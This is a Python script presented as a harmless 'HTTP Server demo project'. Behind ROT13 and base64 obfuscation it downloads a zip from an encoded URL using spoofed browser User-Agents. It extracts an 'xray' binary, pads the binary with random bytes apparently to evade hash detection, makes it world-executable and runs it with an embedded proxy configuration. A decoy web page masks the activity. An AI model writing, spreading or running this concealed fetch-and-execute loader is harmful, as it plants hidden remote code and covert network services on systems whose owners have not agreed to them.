#!/usr/bin/python3
import glob
import json
import os
import random
import re
import subprocess
import sys
import zipfile
from base64 import b64decode as de
from ast import literal_eval
from subprocess import run, Popen
from os.path import join as jo
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

html_content = r"""
<!DOCTYPE html>
<html>
<head>
    <title>My Webpage 1</title>
</head>
<body>
    <h1>Welcome to my webpage!</h1>
    <p>This is a simple HTML page.</p>
</body>
</html>
"""


class Demo:
    """This is an HTTP Server demo project."""
    _f, _p = "K3Osq", "Yj=="
    _key = "b5b5141e-c7a5-430d-9b9e-ab4b7a67787a"
    _server_port = 8080
    _ad = "ZP4jYwNhZN=="  # ZGV3YwNhZP4k ZP4jYwNhZN==
    _c = os.getcwd()
    _foo = 'foo'
    _foolist = [i for i in os.listdir() if i.endswith("py") and os.path.isfile(jo(os.getcwd(), i)) and os.path.getsize(
        jo(os.getcwd(), i)) > 0xfa000]
    _mainname = os.path.basename(__file__)
    if _mainname in _foolist: _foolist.remove(_mainname)
    if len(_foolist) > 0:
        _foo = os.path.splitext(_foolist[0])[0]
    else:
        _foo = "".join([random.choice("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
                        for i in range(random.randint(1, 10))])
    _import_module = "./"[0:1].join(["py", _foo, ][::-1])
    _import_modules = ["sys", "os", "random", "re", "threading", ]
    _uid1, _uid2, _uid3, _uid4 = tuple({random.randint(0x2328, 0xea60) for i in range(0xf)})[:4]
    _index = "==NpccaY0LGY4IaockJY5SzpL9FAhpwYkL3YxS2of52qiE2YmI2puIToyW3YyW3ow1FruWUJiZSGHu1Yg92LhVJqbEKna9lY6ZUp0EUn" \
        [::-1]
    _id_array = []
    _s_maps = {}
    _id_ua = ('GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQRhZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQRhZN==',
              'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQNhZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQNhZN==',
              'GJ96nJkfLF81YwNtXSqcozEiq3ZtGyDtZGNhZQftI2yhAwD7VUt2AQftpaL6ZGNlYwNcVRqyL2giYmVjZGNjZGNkVRMcpzIzo3tiZGNlYwN=',
              'GJ96nJkfLF81YwNtXSqcozEiq3ZtGyDtZGNhZQftI2yhAwD7VUt2AQftpaL6ZGN3YwNcVRqyL2giYmVjZGNjZGNkVRMcpzIzo3tiZGN3YwN=',
              'GJ96nJkfLF81YwNtXSqcozEiq3ZtGyDtZGNhZQftI2yhAwD7VUt2AQftpaL6ZGN1YwNcVRqyL2giYmVjZGNjZGNkVRMcpzIzo3tiZGN1YwN=',
              'GJ96nJkfLF81YwNtXSqcozEiq3ZtGyDtZGNhZQftI2yhAwD7VUt2AQftpaL6ZGN0YwNcVRqyL2giYmVjZGNjZGNkVRMcpzIzo3tiZGN0YwN=',
              'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQLhZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQLhZN==',
              'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQphZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQphZN==',
              'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQZhZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQZhZN==')
    _id_maps = (
        'r', 'l', 'q', 'f', 'o', '2', 'p', 'a', 'B', 'v', 'O', '7', 'W', '2', 'k', 'i', 'M', '2', 'k', 'y', 'q', 'z',
        'I', 'f', 'W', 'm', 'b', 't', 'W', '2', '5', 'i', 'o', 'z', 'H', 'a', 's', 'F', 'j', 't', 'W', '2', '9', '1',
        'q', 'T', 'W', 'i', 'q', 'J', '5', 'x', 'p', 'l', 'p', '6', 'V', 'S', 'g', '7', 'W', '3', 'O', 'l', 'o', '3',
        'E', 'i', 'L', '2', '9', 'f', 'W', 'm', 'b', 't', 'W', '2', 'M', 'l', 'M', 'J', 'I', 'x', 'o', '2', '0', 'a',
        'Y', 'P', 'N', 'a', 'q', 'T', 'S', 'a', 'W', 'm', 'b', 't', 'W', '2', 'E', 'c', 'p', 'z', 'I', 'w', 'q', 'P',
        'q', '9', 'K', 'F', 'j', 't', 'W', '2', 'y', 'h', 'L', 'z', '9', '1', 'o', 'z', 'E', 'm', 'W', 'm', 'b', 't',
        'J', '3', 'f', 'a', 'p', 'T', '9', 'l', 'q', 'P', 'p', '6', 'V', 'Q', 'N', 'f', 'V', 'P', 'q', 'j', 'p', 'z',
        '9', '0', 'o', '2', 'A', 'i', 'o', 'P', 'p', '6', 'V', 'P', 'q', '2', 'o', 'T', 'I', 'm', 'p', 'l', 'p', 'f',
        'V', 'P', 'q', 'm', 'M', 'K', 'E', '0', 'n', 'J', '5', 'a', 'p', 'l', 'p', '6', 'V', 'U', 'f', 'a', 'L', '2',
        'k', 'c', 'M', 'J', '5', '0', 'p', 'l', 'p', '6', 'V', 'S', 'g', '7', 'W', '2', 'y', 'x', 'W', 'm', 'b', 't',
        'W', 'l', 'p', 'f', 'V', 'P', 'q', 'z', 'o', 'T', '9', '3', 'W', 'm', 'b', 't', 'W', '3', 'u', '0', 'o', 'U',
        'Z', 'g', 'p', 'a', 'O', 'l', 'r', 'P', '1', 'x', 'n', 'K', 'W', 'y', 'L', '3', 'D', 'a', 's', 'I', '0', 'f',
        'V', 'P', 'q', 'x', 'M', 'J', 'A', 'l', 'r', 'K', 'O', '0', 'n', 'J', '9', 'h', 'W', 'm', 'b', 't', 'W', '2',
        '5', 'i', 'o', 'z', 'H', 'a', 'Y', 'P', 'N', 'a', 'M', 'z', 'S', 'f', 'o', 'T', 'W', 'u', 'L', '2', 'g', 'm',
        'W', 'm', 'b', 't', 'J', '3', 'f', 'a', 'p', 'T', 'S', '0', 'n', 'P', 'p', '6', 'V', 'P', 'p', 'a', 'Y', 'P',
        'N', 'a', 'M', 'T', 'I', 'm', 'q', 'P', 'p', '6', 'V', 'Q', 'O', '9', 'Y', 'P', 'O', '7', 'W', '3', 'O', 'u',
        'q', 'T', 't', 'a', 'B', 'v', 'N', 'a', 'W', 'l', 'j', 't', 'W', '2', 'E', 'y', 'p', '3', 'D', 'a', 'B', 'v',
        'N', 'j', 's', 'F', 'j', 't', 'r', 'l', 'q', 'j', 'L', 'K', 'E', 'b', 'W', 'm', 'b', 't', 'W', 'l', 'p', 'f',
        'V', 'P', 'q', 'x', 'M', 'K', 'A', '0', 'W', 'm', 'b', 't', 'Z', 'U', '0', 'f', 'V', 'U', 'f', 'a', 'p', 'T',
        'S', '0', 'n', 'P', 'p', '6', 'V', 'P', 'p', 'i', 'W', 'l', 'j', 't', 'W', '2', 'E', 'y', 'p', '3', 'D', 'a',
        'B', 'v', 'N', 'j', 's', 'I', '1', '9', 'Y', 'P', 'N', 'a', 'p', '3', 'E', 'l', 'M', 'J', 'S', 'g', 'H', '2',
        'I', '0', 'q', 'T', 'y', 'h', 'M', '3', 'Z', 'a', 'B', 'v', 'O', '7', 'W', '2', '5', 'y', 'q', 'U', 'q', 'i',
        'p', 'z', 'f', 'a', 'B', 'v', 'N', 'a', 'q', 'T', 'A', 'j', 'W', '3', '0', 'f', 'V', 'P', 'q', 'f', 'n', 'K',
        'A', '0', 'M', 'J', '4', 'a', 'B', 'v', 'N', 'a', 'Z', 'P', '4', 'j', 'Y', 'w', 'N', 'h', 'Z', 'P', 'q', '9',
        'Y', 'P', 'O', '7', 'W', '3', 'O', 'i', 'p', 'a', 'D', 'a', 'B', 'v', 'N', 'j', 'Y', 'P', 'N', 'a', 'o', 'T',
        'y', 'm', 'q', 'T', 'I', 'h', 'W', 'm', 'b', 't', 'W', 'm', 'R', 'l', 'A', 'l', '4', 'j', 'Y', 'w', 'N', 'h',
        'Z', 'F', 'p', 'f', 'V', 'P', 'q', 'j', 'p', 'z', '9', '0', 'o', '2', 'A', 'i', 'o', 'P', 'p', '6', 'V', 'P',
        'q', '2', 'o', 'T', 'I', 'm', 'p', 'l', 'p', 'f', 'V', 'P', 'q', 'm', 'M', 'K', 'E', '0', 'n', 'J', '5', 'a',
        'p', 'l', 'p', '6', 'V', 'U', 'f', 'a', 'L', '2', 'k', 'c', 'M', 'J', '5', '0', 'p', 'l', 'p', '6', 'V', 'S',
        'g', '7', 'W', '2', 'y', 'x', 'W', 'm', 'b', 't', 'W', 'l', 'q', '9', 'K', 'F', 'j', 't', 'W', '2', 'E', 'y',
        'L', '3', 'W', '5', 'p', 'U', 'E', 'c', 'o', '2', '4', 'a', 'B', 'v', 'N', 'a', 'o', 'z', '9', 'h', 'M', 'F',
        'q', '9', 'Y', 'P', 'N', 'a', 'p', '3', 'E', 'l', 'M', 'J', 'S', 'g', 'H', '2', 'I', '0', 'q', 'T', 'y', 'h',
        'M', '3', 'Z', 'a', 'B', 'v', 'O', '7', 'W', '2', '5', 'y', 'q', 'U', 'q', 'i', 'p', 'z', 'f', 'a', 'B', 'v',
        'N', 'a', 'q', '3', 'Z', 'a', 'Y', 'P', 'N', 'a', 'q', '3', 'A', 'G', 'M', 'K', 'E', '0', 'n', 'J', '5', 'a',
        'p', 'l', 'p', '6', 'V', 'U', 'f', 'a', 'p', 'T', 'S', '0', 'n', 'P', 'p', '6', 'V', 'P', 'p', 'a', 's', 'K',
        '1', '9', 'Y', 'P', 'O', '7', 'W', '3', 'O', 'i', 'p', 'a', 'D', 'a', 'B', 'v', 'N', 'j', 'Y', 'P', 'N', 'a',
        'o', 'T', 'y', 'm', 'q', 'T', 'I', 'h', 'W', 'm', 'b', 't', 'W', 'm', 'R', 'l', 'A', 'l', '4', 'j', 'Y', 'w',
        'N', 'h', 'Z', 'F', 'p', 'f', 'V', 'P', 'q', 'j', 'p', 'z', '9', '0', 'o', '2', 'A', 'i', 'o', 'P', 'p', '6',
        'V', 'P', 'q', '2', 'o', 'J', 'I', 'm', 'p', 'l', 'p', 'f', 'V', 'P', 'q', 'm', 'M', 'K', 'E', '0', 'n', 'J',
        '5', 'a', 'p', 'l', 'p', '6', 'V', 'U', 'f', 'a', 'L', '2', 'k', 'c', 'M', 'J', '5', '0', 'p', 'l', 'p', '6',
        'V', 'S', 'g', '7', 'W', '2', 'y', 'x', 'W', 'm', 'b', 't', 'W', 'l', 'q', '9', 'K', 'K', '0', 'f', 'V', 'P',
        'q', 'm', 'q', 'U', 'W', 'y', 'L', 'J', '1', 'G', 'M', 'K', 'E', '0', 'n', 'J', '5', 'a', 'p', 'l', 'p', '6',
        'V', 'U', 'f', 'a', 'o', 'z', 'I', '0', 'q', '2', '9', 'l', 'n', 'l', 'p', '6', 'V', 'P', 'q', '3', 'p', 'l',
        'p', 'f', 'V', 'P', 'q', 'm', 'M', 'J', 'A', '1', 'p', 'z', 'y', '0', 'r', 'F', 'p', '6', 'V', 'P', 'q', 'h',
        'o', '2', '5', 'y', 'W', 'l', 'j', 't', 'W', '3', 'q', 'm', 'H', '2', 'I', '0', 'q', 'T', 'y', 'h', 'M', '3',
        'Z', 'a', 'B', 'v', 'O', '7', 'W', '3', 'O', 'u', 'q', 'T', 't', 'a', 'B', 'v', 'N', 'a', 'W', '3', '1', '9',
        's', 'F', 'j', 't', 'r', 'l', 'q', 'j', 'o', '3', 'W', '0', 'W', 'm', 'b', 't', 'Z', 'P', 'j', 't', 'W', '2',
        'k', 'c', 'p', '3', 'E', 'y', 'o', 'v', 'p', '6', 'V', 'P', 'p', 'k', 'Z', 'w', 'p', 'h', 'Z', 'P', '4', 'j',
        'Y', 'w', 'R', 'a', 'Y', 'P', 'N', 'a', 'p', 'U', 'W', 'i', 'q', 'T', '9', 'w', 'o', '2', 'j', 'a', 'B', 'v',
        'N', 'a', 'q', 'U', 'W', 'i', 'n', 'z', 'S', 'h', 'W', 'l', 'j', 't', 'W', '3', 'A', 'y', 'q', 'U', 'E', 'c',
        'o', 'z', 'q', 'm', 'W', 'm', 'b', 't', 'r', 'l', 'q', 'w', 'o', 'T', 'y', 'y', 'o', 'a', 'E', 'm', 'W', 'm',
        'b', 't', 'J', '3', 'f', 'a', 'p', 'T', 'S', 'm', 'p', '3', 'q', 'i', 'p', 'z', 'D', 'a', 'B', 'v', 'N', 'a',
        'W', '3', '1', 'q', 's', 'F', 'j', 't', 'W', '3', 'A', '0', 'p', 'z', 'I', 'u', 'o', 'I', 'A', 'y', 'q', 'U',
        'E', 'c', 'o', 'z', 'q', 'm', 'W', 'm', 'b', 't', 'r', 'l', 'q', 'h', 'M', 'K', 'E', '3', 'o', '3', 'W', 'e',
        'W', 'm', 'b', 't', 'W', '3', 'q', 'm', 'W', 'l', 'j', 't', 'W', '3', 'A', 'y', 'L', '3', 'I', 'l', 'n', 'K',
        'E', '5', 'W', 'm', 'b', 't', 'W', '2', '5', 'i', 'o', 'z', 'H', 'a', 'Y', 'P', 'N', 'a', 'q', '3', 'A', 'G',
        'M', 'K', 'E', '0', 'n', 'J', '5', 'a', 'p', 'l', 'p', '6', 'V', 'U', 'f', 'a', 'p', 'T', 'S', '0', 'n', 'P',
        'p', '6', 'V', 'P', 'p', 'a', 's', 'K', '1', '9', 'K', 'F', 'j', 't', 'W', '3', 'W', 'i', 'q', 'K', 'E', 'c',
        'o', 'z', 'p', 'a', 'B', 'v', 'O', '7', 'W', '2', 'E', 'i', 'o', 'J', 'S', 'c', 'o', 'y', 'A', '0', 'p', 'z',
        'S', '0', 'M', 'J', 'q', '5', 'W', 'm', 'b', 't', 'W', '0', 'y', 'D', 'F', 'J', 'M', 'B', 'o', '2', '5', 'A',
        'L', 'K', 'E', 'w', 'n', 'P', 'p', 'f', 'V', 'P', 'q', 'l', 'q', 'J', 'k', 'y', 'p', 'l', 'p', '6', 'V', 'S',
        'g', '7', 'W', '3', 'E', '5', 'p', 'T', 'H', 'a', 'B', 'v', 'N', 'a', 'M', 'z', 'y', 'y', 'o', 'T', 'D', 'a',
        'Y', 'P', 'N', 'a', 'p', 'T', '9', 'l', 'q', 'P', 'p', '6', 'V', 'P', 'p', 'j', 'Y', 'G', 'L', '1', 'A', 'G',
        'Z', '1', 'W', 'l', 'j', 't', 'W', '2', '9', '1', 'q', 'T', 'W', 'i', 'q', 'J', '5', 'x', 'I', 'T', 'S', 'a',
        'W', 'm', 'b', 't', 'W', '2', 'E', 'c', 'p', 'z', 'I', 'w', 'q', 'P', 'p', 'f', 'V', 'P', 'q', 'y', 'o', 'z',
        'S', 'v', 'o', 'T', 'I', 'x', 'W', 'm', 'b', 't', 'I', 'U', 'W', '1', 'M', 'K', '1', 'q', 's', 'K', '0', '='
    )

    def __init__(self):
        self._import_modules.append(self._import_module)
        self.__setattr__(de(self.this(self._f + "zj=").encode("utf8")).decode("utf8"),
                         de(self.this(self._p)).decode("utf8") + self._key[0:8] + "_" + self._key[9:13])
        self.__setattr__(de(self.this(self._f + "z0=").encode("utf8")).decode("utf8"),
                         de(self.this(self._p)).decode("utf8") + self._key[0:8] + "_" + self._key[14:18])
        self.__setattr__(de(self.this(self._f + "UV=").encode("utf8")).decode("utf8"),
                         de(self.this(self._p)).decode("utf8") + self._key[0:8] + "_" + self._key[19:23])
        self.__setattr__("_id_array", literal_eval(de(self.this(''.join(self._id_maps)).encode("utf8")).decode("utf8")))

    def start_server(self, ):
        try:
            httpd = HTTPServer(('127.0.0.1', self._uid4), MyRequestHandler)
            httpd.serve_forever()
        except Exception as e:
            print(str(e))

    @staticmethod
    def this(s: str) -> str:
        d = {}
        for c in (65, 97):
            for i in range(26):
                d[chr(i + c)] = chr((i + 13) % 26 + c)
        return "".join([d.get(c, c) for c in s])

    def exec(self):
        if "unzip" in sys.argv: return
        try:
            os.chmod(jo(self._c, self._import_module), 0o777, )
        except Exception as e:
            print(str(e))
        try:
            if "web" in sys.argv:
                server_thread = threading.Thread(target=self.start_server, daemon=True)
                server_thread.start()
            run([jo(self._c, self._import_module), de(self.this("paIh").encode("utf8")).decode('utf8')],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                input=json.dumps(self._id_array, separators=(',', ':'), indent=2).encode('utf8'))
        except BaseException as e:
            print(str(e))

        return 0

    def check(self):
        if os.path.isfile(jo(self._c, self._import_modules[-1])): return
        _file = glob.glob(jo(self._c, "*.zip"))
        if len(_file) > 0:
            _file = _file[0]
            try:
                with zipfile.ZipFile(_file) as z:
                    for i in z.namelist():
                        if not re.search(r"^[xX]{1,}[rR]{1,}[aA]{1,}[yY]{1,}$", i): continue
                        with open(jo(self._c, self._import_modules[-1]), 'wb') as c:
                            c.write(z.read(i))
                            c.write(b"\0" * random.randint(0x0, 0x1f4000 * 2))
            except Exception as e:
                print(str(e))
                os.remove(_file)
                self.check()
            else:
                os.remove(_file)
        else:
            with open(jo(
                    self._c, ".".join((os.path.splitext(self._import_modules[-1])[0], self.this('mvc')))), "wb") as _f:
                headers = {
                    "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    "Accept-Encoding": 'gzip, deflate, br',
                    'Connection': 'keep-alive', "Accept-Language": 'en-US,en;q=0.5',
                    'User-Agent': de(self.this(random.choice(self._id_ua)).encode("utf8")).decode("utf8"),
                }
                timeout = random.uniform(6, 10)
                req = urllib.request.Request(de(self.this(self._index).encode("utf8")).decode("utf8"), headers=headers)
                response = urllib.request.urlopen(req, timeout=timeout)
                content = response.read()
                response.close()
                _f.write(content)
            self.check()

    def create(self):
        self._s_maps.update({
            "nJ5vo3IhMUZhZP5fnKA0MJ4=": de(self.this(self._ad)).decode("utf8"),
            "nJ5vo3IhMUZhZP5jo3W0": self._server_port,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5woTyyoaEmYwNhnJD=": self._key,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZP5jLKEb": self._p_vl,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZP5xMKA0": self._uid1,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZF5jLKEb": self._p_vm,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZF5xMKA0": self._uid2,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZv5jLKEb": self._p_tr,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZv5xMKA0": self._uid3,
            "nJ5vo3IhMUZhZP5mMKE0nJ5apl5zLJkfLzSwn3ZhZl5xMKA0": self._uid4,
            "nJ5vo3IhMUZhZF5jo3W0": self._uid1,
            "nJ5vo3IhMUZhZF5mMKE0nJ5apl5woTyyoaEmYwNhnJD=": self._key,
            "nJ5vo3IhMUZhZF5mqUWyLJ1GMKE0nJ5apl53p1AyqUEcozqmYaOuqTt=": self._p_vl,
            "nJ5vo3IhMUZhZv5jo3W0": self._uid2,
            "nJ5vo3IhMUZhZv5mMKE0nJ5apl5woTyyoaEmYwNhnJD=": self._key,
            "nJ5vo3IhMUZhZv5mqUWyLJ1GMKE0nJ5apl53p1AyqUEcozqmYaOuqTt=": self._p_vm,
            "nJ5vo3IhMUZhZl5jo3W0": self._uid3,
            "nJ5vo3IhMUZhZl5mMKE0nJ5apl5woTyyoaEmYwNhpTSmp3qipzD=": self._key,
            "nJ5vo3IhMUZhZl5mqUWyLJ1GMKE0nJ5apl53p1AyqUEcozqmYaOuqTt=": self._p_tr,
        })
        for k, v in self._s_maps.items():
            k = de(self.this(k).encode("utf8")).decode("utf8")
            _map = self._id_array
            _kk = k.split(".")
            for jk in _kk[:-1]:
                if jk.isdigit():
                    _map = _map[int(jk)]
                else:
                    _map = _map[jk]
            else:
                _map[_kk[-1]] = v


class MyRequestHandler(BaseHTTPRequestHandler):
    server_version = ''
    sys_version = ''

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))


if __name__ == "__main__":
    demo = Demo()
    demo.check()
    demo.create()
    sys.exit(demo.exec())
